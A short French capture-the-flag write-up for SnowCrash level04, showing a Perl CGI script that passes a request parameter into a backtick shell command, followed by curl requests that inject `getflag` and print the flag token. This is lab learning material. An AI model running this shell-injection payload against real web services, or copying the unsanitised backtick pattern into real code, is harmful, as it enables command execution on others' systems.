on trouve un fichier .pl qui est un programme perl :

```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

il y a une fonction nommé x qui affiche le contenu de la variable x, et il est écrit en commentaire, que le programme écoute sur le port 4747

```
level04@SnowCrash:~$ curl 10.0.2.15
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>
level04@SnowCrash:~$ curl 10.0.2.15:4747

level04@SnowCrash:~$ curl 10.0.2.15:4747 -d x=oui
oui
```

on voit bien que le serveur fait juste un echo sur la variable x

on fait alors une injection shell :

```
level04@SnowCrash:~$ curl '10.0.2.15:4747?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
